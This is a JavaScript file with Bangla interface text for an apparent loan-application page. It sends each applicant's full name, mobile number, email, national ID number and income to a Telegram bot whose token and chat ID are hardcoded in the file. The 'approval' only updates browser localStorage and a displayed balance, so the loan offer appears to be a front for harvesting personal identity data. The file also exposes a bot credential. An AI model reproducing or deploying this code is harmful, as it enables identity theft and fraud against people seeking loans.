// টেলিগ্রাম সেটিংস পান
function getTelegramSettings() {
    const settings = localStorage.getItem('telegramSettings');
    return settings ? JSON.parse(settings) : {
        botToken: '8597847429:AAE1vMkpmk8R7NfhRGnTU6ymtCtjtyUUhaw',
        chatId: '6414535964',
        webhookUrl: ''
    };
}

// টেলিগ্রাম সেটিংস সংরক্ষণ করুন
function saveSettings() {
    const botToken = document.getElementById('telegramBotToken').value.trim();
    const chatId = document.getElementById('telegramChatId').value.trim();
    const webhookUrl = document.getElementById('webhookUrl').value.trim();

    if (!botToken || !chatId) {
        showErrorAlert('ত্রুটি', 'টেলিগ্রাম বট টোকেন এবং চ্যাট আইডি প্রয়োজন।');
        return;
    }

    const settings = {
        botToken: botToken,
        chatId: chatId,
        webhookUrl: webhookUrl
    };

    localStorage.setItem('telegramSettings', JSON.stringify(settings));
    showSuccessAlert('সফল', 'টেলিগ্রাম সেটিংস সংরক্ষিত হয়েছে!');

    // মডাল বন্ধ করুন
    setTimeout(() => {
        const modal = bootstrap.Modal.getInstance(document.getElementById('settingsModal'));
        if (modal) modal.hide();
    }, 500);
}

// টেস্ট মেসেজ পাঠান
function testTelegramConnection() {
    const settings = getTelegramSettings();

    if (!settings.botToken || !settings.chatId) {
        showErrorAlert('সেটিংস প্রয়োজন', 'প্রথমে বট টোকেন এবং চ্যাট আইডি যোগ করুন।');
        return;
    }

    showLoadingSpinner('টেস্টিং', 'টেলিগ্রাম সংযোগ পরীক্ষা করছি...');

    const message = `✅ টেলিগ্রাম বট টেস্ট সফল!\n\nসময়: ${new Date().toLocaleString('en-US', {timeZone: 'Asia/Dhaka'})}`;

    fetch(`https://api.telegram.org/bot${settings.botToken}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: settings.chatId,
            text: message,
            parse_mode: 'HTML'
        })
    })
    .then(response => response.json())
    .then(data => {
        hideLoadingSpinner();
        if (data.ok) {
            showSuccessAlert('সফল', 'টেস্ট মেসেজ পাঠানো হয়েছে!');
        } else {
            showErrorAlert('ত্রুটি', 'বট টোকেন বা চ্যাট আইডি অবৈধ।');
        }
    })
    .catch(error => {
        hideLoadingSpinner();
        showErrorAlert('ত্রুটি', 'সংযোগ ব্যর্থ: ' + error.message);
    });
}

// টেলিগ্রামে লোন তথ্য পাঠান
function sendToTelegram(applicationId, formData, settings) {
    const approveButtonUrl = `${window.location.origin}?approve=${applicationId}`;
    const rejectButtonUrl = `${window.location.origin}?reject=${applicationId}`;

    const message = `
📋 <b>নতুন লোন আবেদন</b>

<b>আবেদন ID:</b> <code>${applicationId}</code>
<b>নাম:</b> ${formData.fullName}
<b>মোবাইল:</b> ${formData.mobileNumber}
<b>ইমেইল:</b> ${formData.email}
<b>এনআইডি:</b> ${formData.nid}
<b>লোন অ্যামাউন্ট:</b> ৳${formatBanglaNumber(formData.loanAmount)}
<b>সময়কাল:</b> ${formData.loanTerm} মাস
<b>বার্ষিক আয়:</b> ৳${formatBanglaNumber(formData.annualIncome)}
<b>আবেদনের সময়:</b> ${formData.submittedAt}

⏳ <b>অপেক্ষমাণ স্ট্যাটাস:</b> অনুমোদনের জন্য অপেক্ষা করছি...
    `;

    const inlineKeyboard = {
        inline_keyboard: [
            [
                {
                    text: '✅ অনুমোদন করুন',
                    callback_data: `approve_${applicationId}`
                },
                {
                    text: '❌ প্রত্যাখ্যান করুন',
                    callback_data: `reject_${applicationId}`
                }
            ]
        ]
    };

    fetch(`https://api.telegram.org/bot${settings.botToken}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: settings.chatId,
            text: message,
            parse_mode: 'HTML',
            reply_markup: inlineKeyboard
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            console.log('টেলিগ্রাম মেসেজ সফলভাবে পাঠানো হয়েছে');
        } else {
            console.error('টেলিগ্রাম মেসেজ পাঠানো ব্যর্থ:', data.description);
        }
    })
    .catch(error => {
        console.error('টেলিগ্রাম API ত্রুটি:', error);
    });
}

// পেন্ডিং আবেদন স্টোর করুন
function storePendingApplication(applicationId, formData) {
    let pendingApplications = JSON.parse(localStorage.getItem('pendingApplications')) || {};
    pendingApplications[applicationId] = {
        ...formData,
        status: 'pending',
        createdAt: new Date().getTime()
    };
    localStorage.setItem('pendingApplications', JSON.stringify(pendingApplications));
}

// অনুমোদনের জন্য পোলিং করুন
function pollForApproval(applicationId, loanAmount) {
    let pollCount = 0;
    const maxPolls = 720; // 12 ঘন্টা (প্রতি সেকেন্ডে পোল)

    const pollInterval = setInterval(() => {
        pollCount++;

        const pendingApplications = JSON.parse(localStorage.getItem('pendingApplications')) || {};
        const application = pendingApplications[applicationId];

        if (!application) {
            clearInterval(pollInterval);
            hideLoadingDisplay();
            return;
        }

        if (application.status === 'approved') {
            clearInterval(pollInterval);
            hideLoadingDisplay();
            approveApplication(applicationId, loanAmount, application);
            return;
        }

        if (application.status === 'rejected') {
            clearInterval(pollInterval);
            hideLoadingDisplay();
            rejectApplication(applicationId, application);
            return;
        }

        // সর্বোচ্চ সময়সীমা অতিক্রম করলে
        if (pollCount >= maxPolls) {
            clearInterval(pollInterval);
            hideLoadingDisplay();
            showWarningAlert(
                'সময় শেষ',
                'আপনার আবেদনের জন্য সিদ্ধান্ত পাওয়া যায়নি। পরে আবার চেষ্টা করুন।'
            );
            return;
        }
    }, 1000); // প্রতি সেকেন্ডে পোল করুন
}

// আবেদন অনুমোদন করুন
function approveApplication(applicationId, loanAmount, application) {
    // বর্তমান ব্যালেন্স পান
    const balanceElement = document.getElementById('currentBalance');
    const currentBalanceText = balanceElement.textContent;
    const currentBalance = parseInt(currentBalanceText.replace(/[^0-9]/g, '')) || 0;

    // নতুন ব্যালেন্স যোগ করুন
    const newBalance = currentBalance + loanAmount;
    balanceElement.textContent = formatBanglaNumber(newBalance) + ' Taka';

    // লোকাল স্টোরেজে আপডেট করুন
    let pendingApplications = JSON.parse(localStorage.getItem('pendingApplications')) || {};
    pendingApplications[applicationId].status = 'approved';
    pendingApplications[applicationId].approvedAt = new Date().getTime();
    localStorage.setItem('pendingApplications', JSON.stringify(pendingApplications));

    // সাফল্যের বার্তা দেখান
    showSuccessAlert(
        '✅ লোন অনুমোদিত!',
        `আপনার লোন আবেদন অনুমোদিত হয়েছে। ৳${formatBanglaNumber(loanAmount)} আপনার অ্যাকাউন্টে যোগ করা হয়েছে।`
    );

    console.log('আবেদন অনুমোদিত:', applicationId);
}

// আবেদন প্রত্যাখ্যান করুন
function rejectApplication(applicationId, application) {
    // লোকাল স্টোরেজে আপডেট করুন
    let pendingApplications = JSON.parse(localStorage.getItem('pendingApplications')) || {};
    pendingApplications[applicationId].status = 'rejected';
    pendingApplications[applicationId].rejectedAt = new Date().getTime();
    localStorage.setItem('pendingApplications', JSON.stringify(pendingApplications));

    // ত্রুটির বার্তা দেখান
    showErrorAlert(
        '❌ লোন প্রত্যাখ্যাত',
        'আপনার লোন আবেদন প্রত্যাখ্যাত হয়েছে। আরও তথ্যের জন্য আমাদের সাথে যোগাযোগ করুন।'
    );

    console.log('আবেদন প্রত্যাখ্যাত:', applicationId);
}

// লোডিং ডিসপ্লে দেখান
function showLoadingDisplay(title = 'লোডিং', message = 'প্রক্রিয়া করছি...') {
    let loadingDiv = document.getElementById('loadingDisplay');
    
    if (!loadingDiv) {
        loadingDiv = document.createElement('div');
        loadingDiv.id = 'loadingDisplay';
        loadingDiv.className = 'position-fixed top-50 start-50 translate-middle';
        loadingDiv.style.cssText = `
            z-index: 9999;
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
            text-align: center;
            min-width: 350px;
        `;
        document.body.appendChild(loadingDiv);
    }

    loadingDiv.innerHTML = `
        <div class="spinner-border text-warning mb-3" role="status">
            <span class="visually-hidden">লোড করছি...</span>
        </div>
        <h5 class="fw-bold text-dark">${title}</h5>
        <p class="text-muted mb-0">${message}</p>
    `;
    
    loadingDiv.style.display = 'block';
}

// লোডিং ডিসপ্লে লুকান
function hideLoadingDisplay() {
    const loadingDiv = document.getElementById('loadingDisplay');
    if (loadingDiv) {
        loadingDiv.style.display = 'none';
    }
}

// ডকুমেন্ট লোড হলে ইনিশিয়ালাইজ করুন
document.addEventListener('DOMContentLoaded', function() {
    // টেলিগ্রাম সেটিংস লোড করুন
    const settings = getTelegramSettings();
    if (settings.botToken) {
        document.getElementById('telegramBotToken').value = settings.botToken;
    }
    if (settings.chatId) {
        document.getElementById('telegramChatId').value = settings.chatId;
    }
    if (settings.webhookUrl) {
        document.getElementById('webhookUrl').value = settings.webhookUrl;
    }
});

